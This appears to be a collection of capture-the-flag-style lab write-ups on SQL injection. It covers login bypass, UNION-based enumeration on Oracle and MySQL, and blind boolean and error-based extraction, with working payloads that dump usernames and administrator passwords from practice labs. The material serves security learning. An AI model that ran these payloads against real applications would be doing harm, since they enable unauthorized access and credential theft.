# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cb75436f-46d8-4223-a333-d02e2a762328)

Going over to the webpage and clicking on ```Gifts```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6da250fc-c7da-40e0-a2a9-b480799c9b9e)

You should get this,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8d3ff589-b4af-4ebe-b289-e33e0d3092aa)

Now, lets capture this request on burpsuite

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f3c61aa9-6328-457c-9ef6-759a6445d02d)

Sending the request over to burp repeater,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/40ce0d22-99e5-4dbf-9505-f49d929d73ab)

To display one or more unreleased products, we can use the payload ```' or 1=1--```, make sure this is url encoded to something like this ```'+or+1%3d1--```.

Adding this payload to the url,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ef4d74eb-dd1b-42e4-ab2b-2d9c795441ca)

cool, the status code is "ok". Viewing the response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1e5003b4-7002-4fb4-9f2a-7e0d2206dfea)

Nice, we have successfully solved the lab😎.

------------------------------

# SQL injection vulnerability allowing login bypass
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fe917a2c-c5ee-4957-a733-9791d8041234)

Navigating to the webpage and clicking on "My Account"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/84e38257-e3d5-4722-b16e-9a736d67ac1e)

You should get this,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f4f46852-8207-4ab0-a157-8523b8b9dda5)

So we are asked to login as the ```administrator``` user, to do this we can use this

username:```administrator'--```          password:```aaaaaaa```

Note: We can either provide a blank password or we use any random stuff for the password since the password will get commented out anyways

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/85078867-6d9a-49b4-ae35-f179f3c1ec43)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bcde4b54-e194-499a-ae31-95dfeb16e484)

Cool, we have successfully solved the lab

---------------------

# SQL injection attack, querying the database type and version on Oracle
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1a110c4b-d810-42b6-b7f3-b5f9df4e4544)

Navigating to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a6c32fe1-538c-430b-8725-13a4afaf4e08)

Capturing the request on burpsuite,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6974648d-151b-4b1d-a68e-1aad9dbcf6b6)

First thing to do is to confirm the number of columns available in the database

So, we'll be using the query
```sql
' order by 1--
' order by 2--
' order by 3--
```
Ensure this is url encoded, so when you get the internal server error, it means the column number isn't available

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/46cca6a6-9af2-41e9-a473-8f2388847fce)

This means there's a column available in the database,

Trying other queries

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/413576a4-6bb9-4cab-918c-d629f51080fb)

This makes it 2 columns available in the database,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/28d25efa-ca02-4434-93ae-a908703068d9)

From the above screenshot you'll see that the query ```' order by 3--``` returned an Internal Server Error, which means there isn't a column 3 available in the database.

So, we have 2 columns available in the database.

To query the database version we can use the following query 
```sql
' UNION SELECT banner,null FROM v$version--
```
Explaining this
```
The banner column contains the information about the database version
The null is just there to fill in for the second column of the result
v$version is the name of a database table
```
Trying the query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9f5f9626-7647-445a-8c29-3d021874baf0)

Lets show the response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a8001d54-7b63-488e-aa76-10bb21085337)

Nice, we have successfully solved the lab

-------------------------

# SQL injection attack, querying the database type and version on MySQL and Microsoft
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/178842fc-a6ef-4ae6-a5db-6dfe6ad690e9)

Navigating to the webpage, clicking on "Gifts"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2fdc0c82-d053-4b7d-b950-8320359cac38)

Capturing this request on burpsuite and sending it over to burp intruder

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f8492bbd-7d49-4822-acc0-9fb99834b8e1)

Now, lets check the number of columns available in the database using the query
```sql
' order by 1-- -
' order by 2-- -
' order by 3-- -
```
Ensure this is url encoded, so when you get the internal server error, it means the column number isn't available

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3a425de3-a5bc-45d1-8c42-49ab259a9d9b)

This means we have a column available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4213061d-8978-4139-98a8-969f29cdf0e9)

This means we have 2 columns available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/df69463e-1b78-4785-bedb-a7d2b1ff3fc2)

From the above screenshot you'll see that the query ```' order by 3-- -``` returned an Internal Server Error, which means there isn't a column 3 available in the database.

Now, to display the database version string, we can use  the query
```sql
' UNION SELECT version(),null-- -
```
Using this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6bc2ab51-98ba-4253-bdb6-54bc1f6c5415)

Now, lets show this response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/07d81260-800d-4d88-90df-1e5695deaf95)

Nice, we have successfully completed the task for this lab😎

--------------------------

# SQL injection attack, listing the database contents on non-Oracle databases
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4b71c9e3-4b94-4834-b5c5-a0ee579a0c1e)

Navigate to the webpage and click on "Gift"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d8704324-610b-4fb8-a5c6-3a0d1c436dad)

Capturing the request on burpsuite and sending it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e3971a3f-8b29-4e64-89bc-99cde62a1c2f)

First, lets check the number of columns available in this database.

We can do that using the queries
```sql
' order by 1--
' order by 2--
' order by 3--
```
Ensure you url encode the queries before using themm

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c75e93d5-10f7-4453-a7f2-2a95acf6320e)

Now, this means we have a column available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f8e49c5a-f5ab-4ed6-87dd-a445af4f8513)

We have 2 columns available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4331b044-4dec-4b1a-928b-364225933074)

We got an Internal Server Error here, this means there isn't a column 3 available in the database.

Hence, we have 2 columns available in the database.

Lets try to get the version the database is running, we can use the query
```sql
' UNION SELECT version(),null--
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5c2c24f3-0b28-422e-bfde-a78afceacc68)

Now, lets check the name of the tables in the database. We can use the query
```sql
' UNION SELECT table_name,null FROM information_schema.tables--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f027d2a4-0b2b-4abd-a750-168372eaa2fd)

We found a table ```users_vqdnay```.

Next thing to do is to check the name of the columns in the table, we can use the query
```sql
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users_vqdnay'--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9e884a31-5c98-4818-9ca8-22dc60184c43)

We got the columns ```username_dgcaur``` and ```password_eygubt```.

Cool, lets dump the contents of the columns using the query
```sql
' UNION SELECT username_dgcaur,password_eygubt FROM users_vqdnay--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2d0f4291-5858-4a65-a5ac-6936bdad6c32)

We got the credentials for the administrator user

username:```administrator```          password:```7ocf0wre9y16c1llsdp1```

Lets go ahead and log in

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d5c976ef-a3bf-48ee-9c21-fe5f8c47832f)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6dbc4baf-367b-4b2b-a3f3-adda3da1aeca)

Nice, we have succesfully completed the task for this lab.

---------------------------

# SQL injection attack, listing the database contents on Oracle
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7465f61f-7882-4c1b-8bca-6804b4324362)

Navigate to the webpage and click on "Gifts"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a3fb15da-dd80-4081-930e-49c1266812a7)

Capturing this request on burpsuite and sending it over to burp repeater,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cbba3330-c8f3-435b-acaa-b11ccc594079)

Lets start out by checking the amount of columns available in the database. We can use the queries
```sql
' order by 1--
' order by 2--
' order by 3--
```
Ensure the queries are url encoded before applying them

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d2edb3a2-1217-45d6-bd92-f0f04e0e17df)

This means we have a column available in the database

Moving on, 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bb6896d2-8423-4d82-9f51-310262faf277)

Now, this means we have 2 columns available in the database

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/22478a20-b1c2-47ad-bfea-4bc003391a4d)

The "Internal Server Error" means that there isn't a third column available in the database.

Lets check the version the database is running using the query
```sql
' UNION SELECT banner,null FROM v$version--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b01f6263-e68a-422f-868b-1deede320ec5)

Cool, we were able to get the version the database is running.

To get the name of the tables in the database, we can use the query
```sql
' UNION SELECT table_name,null FROM all_tables--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e91fdbe-a352-4f1d-8e76-f2c43f9343e9)

We found the table name ```USERS_DHHSSL```

The next thing to do is check the name of columns available in the table. We can do that using the query
```sql
' UNION SELECT column_name,null FROM all_tab_columns WHERE table_name='USERS_DHHSSL'--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/184e3392-f394-4214-b2aa-082e4151600c)

We got the column names ```USERNAME_ZTMDCJ``` and ```PASSWORD_QGFLBW```.

Now, lets go ahead and dump the contents of the columns using the query
```sql
' UNION SELECT USERNAME_ZTMDCJ,PASSWORD_QGFLBW FROM USERS_DHHSSL--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d2fe705e-0b88-47fc-9da8-1d61b0278d1b)

We got the creds for the administrator user

username:```administrator```          password:```8aqefrxiudrdaqkhk3qf```

Lets go ahead and login as the administrator user

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/90028565-b596-46bd-a8bd-5f21c86faf87)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6df244bc-a9f2-4fd7-b3f6-7b99e663f298)

Cool stuff, we have successfully completed the task for this lab.

--------------------

#  SQL injection UNION attack, determining the number of columns returned by the query
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e6da08f-142d-4933-afdd-503cc5d581bd)

Navigate to the webpage and click on "Gifts"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2cc819c4-a5e4-4dfb-aa85-71b2d7dd7449)

Capturing this request on burpsuite and sending it over to burp repeater,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5eb74c8c-1139-4f59-9d5b-aa828507f3c6)

We can use ```UNION``` attack to determine the number of column available. We can use the query
```sql
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT null,null,null--
' UNION SELECT null,null,null,null--
```
So, we'll continue the query like that until we get a ```HTTP response code 200 OK```.

Note: You stop the query when you get ```HTTP response code 200 OK```

Url Encode the queries before applying them

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f5cb029b-d976-4fb2-96c8-8d678e5c2060)

This means, there's more than one column in the database, hence why we are getting the  "Internal Server Error"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8cc78ffe-9570-4ef4-8048-56e203fab051)

We got the error, which means there are more than two columns in the database

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7db9fc51-319b-4dfd-9db8-3633b1f97c21)

We got the ```HTTP response code 200 OK```, which means there are 3 columns in the database.

Showing the response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7690a347-f9aa-4b07-9894-cbcdefda5a76)

We have successfully completed the task for this lab

-------------------------

# SQL injection UNION attack, finding a column containing text
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/49ec3beb-2101-47b6-af5a-8365f9e59c50)

Navigate to the webpage and click on "Lifestyle"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/feed1a8f-b225-442e-80d9-3c3cc9f0f4bf)

Capturing this request on burpsuite and sending it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a6638917-3208-402e-8147-ac6384411c1f)

First, lets determine the number of columns that's available in the database using the query
```sql
' order by 1--
' order by 2--
' order by 3--
' order by 4--
```
Ensure you url encode the query when you use it.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/35bea675-b7b5-4d8e-993b-ff1ad4d566ed)

This means we have a column available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1303a537-2346-40de-8565-09afe6c89516)

Alright, so we have 2 columns available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4c1dded8-aae8-4cfb-bf45-cf8e5c5ce5b7)

So, there are 3 columns available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/57d2fbcb-1b69-46c3-8028-834fe6d48e15)

We got an "Internal Server Error" meaning there isn't a column 4 in the database

Hence, we have 3 columns available in the database.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/50143fc9-d043-43bc-97bd-d2251d5125d7)

So, the task is to check which of the columns is compatible with string data. So, we are asked to return the string ```yuJfMW```.

Now, lets start by using the ```UNION``` method to confirm the number of columns. We can use the query
```sql
' UNION SELECT null,null,null--
```
If we don't get the "Internal Server Error" it means there truly are 3 columns available in the database. 

Applying the query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/201c39b0-c764-4f39-9aa2-86627659a7c7)

cool, now lets look for the vulnerable column that is compatible with string data. We can try the following queries
```sql
' UNION SELECT 'yuJfMW',null,null--
' UNION SELECT null,'yuJfMW',null--
' UNION SELECT null,null,'yuJfMW'--
```
So, a query not returning the "Internal Server Errror" means the column where the string is positioned is vulnerable.

Applying the queries,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8b2d5383-4809-44bb-88ab-a5340f8d49e1)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/029ada9c-28bf-4c1c-af57-1ccfbdf8d784)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/40a12261-5a5a-4a57-b383-ce48c57a39bb)

From the above screensots, you'll see that only the query ```' UNION SELECT null,'yuJfMW',null--``` was able to retrieve the string from the database.

Lets try to show the response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c7484877-9166-43c9-b72c-0e4867f716d9)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e6e6a239-9858-46a9-9b04-e39af6eee080)

Cool, we have successfully solved the lab. So, it is safe to say the second column is compatible with string data.

----------------------

# SQL injection UNION attack, retrieving data from other tables
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6423fe34-f6c3-448e-b70b-3c0ca04d847f)

Navigate to the webpage and click on "Lifestyle"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7f1b7c45-5674-4047-9a70-16d8b0adeb94)

Capturing this request on burpsuite and sending it over to burp repeater,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a1764eb5-41c3-4f7f-aa2a-4b1676306efb)

Now, this should be an easy one since they already gave us the name of the table to be ```users```, also in the table there are columns ```username``` and ```password```. So, what we'll try to do is just determine the number of columns available in the database. We'll be using the query
```sql
' order by 1--
' order by 2--
' order by 3--
```
Applying the query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f921296c-acf7-4567-9d7e-7e7932e7c3ae)

We have a column available in the database

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b6c3f781-4138-418c-a666-1e4b54aec0a1)

Alright, so 2 columns are available in the database

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/20888d82-965e-4eab-afae-5a895cb76c26)

The "Internal Server Error" displayed is to tell us that there isn't a third column in the database.

So, we have 2 columns available in this database

Now, lets go ahead to dump the content of the columns ```username``` and ```password``` in the table ```users```. We can use this query
```sql
' UNION SELECT username,password FROM users--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/188133f5-c518-4378-8a91-e7beb6682ec5)

Cool, we got the creds for the administrator user

username:```administrator```          password:```nqic8fkyvzqjfez72khh```

Lets try to log in with thi creds

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fd1dc676-0992-4910-a13e-0675c83b495f)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9927d49e-288b-4ddc-bce3-9c8902d1f0ad)

Cool, we have successfully completed the task for this lab

-------------------------

# SQL injection UNION attack, retrieving multiple values in a single column
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/68681c2b-03cb-47e4-a526-058afecdae0b)

Navigate to the website and click on "Lifestyle"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e2b5b9fd-20bc-4964-b804-41e7c23c3d01)

Capturing the request on burpsuite and sending it over to burp repeater,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fdce4358-ea13-417d-bc4a-c2208ff03ed0)

Lets go ahead and check the number of columns available in the database, we can use the queries
```sql
' order by 1--
' order by 2--
' order by 3--
```
Using these queries

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1ab904ef-0e97-4a99-95a1-20f57decf51d)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dae2d6ec-e44a-4dc1-97c9-5f1b3fcd3d12)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/af5e229b-cb77-44fa-b08d-a3a7d374aa9b)

From the above screenshot, it is obvious that we have just 2 columns available in the database.

Lets go ahead and look for the vulnerable column, that is, the column that is compatible with string data. To do that we can use the query
```sql
' UNION SELECT 'abeg',null--
' UNION SELECT null,'abeg'--
```
url encode the query before using it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/07eecb17-1072-46b7-be4a-0340a36ebd98)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7878dd78-9ba9-4835-93be-21fe94096f33)

It is evident that the second column is actually compatible with string data.

Now, lets go ahead to dump the content of the columns ```username``` and ```password``` in the table ```users```. We can use this query

```sql
' UNION SELECT null,username || '~' || password FROM users--
```
Applying the query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dcc65a68-30c2-454e-ba9d-b3d21b573f99)

Cool, we got the creds for the administrator user.

username:```administrator```            password:```6tp172ew9j1sy5f7vx3d```

Lets try to log in with this creds we found

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2355ff27-ebbd-41ac-aaee-afb814bc8296)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/690e1d70-a897-471b-a9ea-ac3434922bb2)

Cool, we have successfully solved this lab.

------------------------------

#  Blind SQL injection with conditional responses
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cebd199e-fcb5-44c9-a0f9-97a8940ad3e4)

So, the application uses a tracking cookie for analytics

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c77d83c7-57c6-47f1-8b96-d1eee6311e30)

Click "View details" then capture the request on burpsuite

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e0791be6-76f1-4b3d-a046-964ef73eac0d)

Now, lets use conditional responses to check if it is vulnerable to blind SQLi. We can use the queries
```sql
' AND '1'='1
' AND '1'='2
```
Ensure it is url encoded when using it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ed0b312f-16d3-45cb-afa2-c542203d35d6)

From the above screenshot we got the 'Welcome back!' message, this is because the condition ```'1'='1``` is always true.

Trying the second query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/912710c8-2b29-4f03-9a30-4391fec44413)

So, this didn't return the 'Welcome back!' message, this is because the condition ```'1'='2``` is always false.

Now, that we have confirmed that it is vulnerable, lets go ahead to obtain the password since we know the table name to be ```users``` and the name of the columns in the tables are ```username``` and ```password```. Also, we have the username to be ```administrator```.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2690fe5b-55ac-4c47-8df8-e65719fd9f4e)

Based on the hint we were provided, I think we now know what to focus on

To achieve this, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 's
```
Alright so, we'll be trying the letters all the way from ```a-z```, we'll also try the numbers ```0-9```, until we get a "Welcome back!" message

Trying this query you should get the first character of the password
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'p
```
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cbe640e7-9de5-4c93-b602-5153d527ee1c)

Cool, now that we got the first character, lets go ahead and query for the second character, We can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) = 'q
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bf2a6326-efe4-44a3-baeb-b409234a4bb4)

Getting the 3rd character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 3, 1) = 'l
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a431dd64-b56d-4110-b33d-d78dac3d22de)

Getting the 4th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 4, 1) = '8
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/24c57afa-5628-4c52-9683-b4a5a44c8ea5)

Getting the 5th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 5, 1) = 'z
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/58770009-2009-4ad7-838c-d6cdc6994fc4)

Getting the 6th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 6, 1) = 's
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a08b330c-8929-4189-9f1c-b58b05959e06)

Getting the 7th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 7, 1) = 'm
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0d55d2e0-1f44-4bf5-a015-61f9624e9bc4)

Getting the 7th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 8, 1) = 'j
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dc6e9cfb-a1db-473d-ae1c-42a8d40f856a)

Getting the 8th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 8, 1) = 'j
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/41f1714a-cfcc-4c96-bf35-c6f5d458405e)

Getting the 9th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 9, 1) = 'x
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8aa8b3b9-4588-46ec-80ef-0c010168d0b1)

Getting the 10th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 10, 1) = 'r
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/62ed9426-e9b8-403c-8b30-cbb75c92a49a)

Getting the 11th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 11, 1) = '7
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3015b5af-90f7-481d-92d1-b515cb8cdf66)

Getting the 12th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 12, 1) = 'b
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f2882032-2e5a-4e5d-b193-ff13edae63ed)

Getting the 13th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 13, 1) = 'i
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/347270ba-c25e-432b-8e97-bff5ca068e0b)

Getting the 14th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 14, 1) = 'i
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f9d92107-ce88-4444-be44-191d5e9b72ba)

Getting the 15th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 15, 1) = 'y
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9e906e12-547c-4127-b9c5-fbbaac43cfee)

Getting the 16th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 16, 1) = 'l
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f591a1c0-a458-4e9b-8b66-88bb421c95a3)

Getting the 17th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 17, 1) = 'u
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3f78d1c3-c72d-4f15-959b-86a35ff49521)

Getting the 18th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 18, 1) = 'q
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/31af27ef-2ed1-43ea-b03a-43a11e29f44e)

Getting the 19th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 19, 1) = 't
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a34f82d5-0e55-43bf-9b2a-20588d7532a6)


Getting the 20th character, we can use the query
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 20, 1) = 'j
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/01eaccbe-1d05-43c7-82d7-28b4611a75b5)

So we got the final password to be ```pql8zsmjxr7biiyluqtj```. Lets try to login as the administrator user

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c55b62f0-3daa-40b0-9b36-89cc599fc071)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fd66ec16-64e8-4da4-a8c9-4dd8a017244e)

Nice, we have successfully solved this lab

----------------------------

# Blind SQL injection with conditional errors
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/01eefd1c-7e06-4b4b-b11d-7ffb3ed52888)

Navigate to the webpage and click on "view details"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8859de69-7dad-4974-a986-359b5446525e)

Capturing the request on burpsuite and sending it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/12ff50fb-095a-4758-9a21-3f04be353cb9)

Now, lets start by testing conditions.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/809423b2-153b-4acf-a7bc-ff430cb59f0c)

From the hint provided we can see that this lab uses the oracle dabase

So, using this query we should be able to test the conditions
```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
```
Ensure you url encode this before using it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/85c9f86a-c57f-4955-94f4-8c930ab8fa2e)

We got the "Internal Server Error", this is because ```1=1``` will always be true at all times

Trying the second query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ed83e499-8087-4ba2-bd74-863bb51a298a)

This query didn't throw an error because the condition ```1=2``` is not true

Now, to check if there really exists a user ```administrator```, we can use the query
```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```
If this returns an error it means the user exists in the database

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8936b62f-88ea-4871-94ba-6ed7368b5608)

Cool, the user is available in the database.

Lets go ahead and check the length of the password available in the database, we can use the query
```sql
'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```
So, we are going to keep changing the number ```1``` until we stop getting an error

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e46becf7-62a3-4183-8e4b-71aa3588cab3)

From the above screenshot it is evident that the password is greater than one. 
Trying this manually;

